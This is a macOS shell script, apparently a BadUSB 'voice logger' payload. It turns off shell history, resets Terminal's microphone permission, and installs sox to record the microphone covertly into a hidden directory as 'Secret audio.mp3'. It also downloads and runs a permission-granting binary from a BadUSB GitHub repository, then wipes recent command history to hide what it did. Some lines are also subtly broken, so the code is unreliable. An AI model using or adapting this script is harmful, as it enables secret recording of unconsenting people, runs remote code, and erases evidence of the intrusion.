# Add environment variable settings to .bashrc and reload it
if ! grep -q "HISTCONTROL=ignorespace" ~/.bashrc; then
    echo 'export HISTCONTROL=ignorespace' >>~/.bashrc
fi
if ! grep -q "unset HISTFILE" ~/.bashrc; then
    echo 'unset HISTFILE' >>~/.bashrc
fi
source ~/.bashrc

# Reset microphone permission for Terminal
tccutil reset Microphone com.apple.Terminal

# Create the .phantom_audio directory and navigate into it
if [ ! -d ~/.phantom_audio ]; then
    mkdir -p ~/.phantom_audio
fi
cd ~/.phantom_audio || {
    echo "Failed to navigate to .phantom_audio directory"
    exit 1
}

# Installing "brew" and "sox" voice recording dependency
if ! command -v brew &>/dev/null; then
    echo "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || {
        echo "Failed to install Homebrew"
        exit 1
    }
fi

if ! command -v sox &>/dev/null; then
    brew install sox || {
        echo "Failed to install sox"
        exit 1
    }
fi

# Write the Python script for recording
printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret audio.mp3"\ncmd = "sox -d -C 128 -r 44100 \\"{}\\"".format(filename)\nsubprocess.Popen(cmd, shell=True)\n' >record.py

# Download permission script and execute it
curl -L -o allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/allow_permission_mac_go'
chmod +x allow_permission_mac_go

# Start voice recording
nohup "python3 record.py"
sleep 0.5
./allow_permission_mac_go

# Clear last 12 history command
history | head -n -12 >~/.bash_history && history -c && history -r
